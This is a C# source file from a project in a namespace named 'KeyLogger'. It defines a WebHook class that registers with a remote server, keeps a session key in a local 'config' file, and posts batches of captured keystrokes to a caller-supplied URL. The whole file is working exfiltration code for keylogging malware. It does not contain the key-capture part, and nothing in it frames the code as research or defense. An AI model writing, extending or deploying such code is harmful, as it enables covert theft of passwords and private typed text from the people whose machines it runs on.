using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Http;
using System.Runtime.InteropServices.ComTypes;
using System.Text;
using System.Text.Json.Serialization;
using System.Threading.Tasks;
using Newtonsoft.Json;

namespace KeyLogger
{
    public class WebHook : IDisposable
    {
        private HttpClient _httpClient;
        private string _key;
        private string _keyFile = "config";

        public WebHook()
        {
            _httpClient = new HttpClient();
        }

        public async Task Connect(string url)
        {
            var fi = new FileInfo(_keyFile);
            if (fi.Exists)
            {
                using var reader = fi.OpenText();
                _key = await reader.ReadToEndAsync();
            }

            var response = await _httpClient.PostAsync(url, new StringContent(JsonConvert.SerializeObject(new { key = _key }), Encoding.UTF8, "application/json"));

            if(!response.IsSuccessStatusCode)
                throw new HttpRequestException(response.StatusCode.ToString());

            _key = await response.Content.ReadAsStringAsync();

            using (var writer = fi.CreateText())
            {
                await writer.WriteAsync(_key);
            }
        }

        public async Task SendKeys(string url, IList<KeyPress> keys)
        {
            var obj = new
            {
                key = _key,
                keys = keys
            };
            var data = new StringContent(JsonConvert.SerializeObject(obj), Encoding.UTF8, "application/json");
            var response = await _httpClient.PostAsync(url, data);

            if (response.IsSuccessStatusCode)
            {
                var k = await response.Content.ReadAsStringAsync();
                if (!_key.Equals(k))
                {
                    _key = k;

                    var fi = new FileInfo(_keyFile);
                    using (var writer = fi.CreateText())
                    {
                        await writer.WriteAsync(_key);
                    }
                }
            }
        }

        public void Dispose()
        {
            _httpClient?.Dispose();
        }
    }
}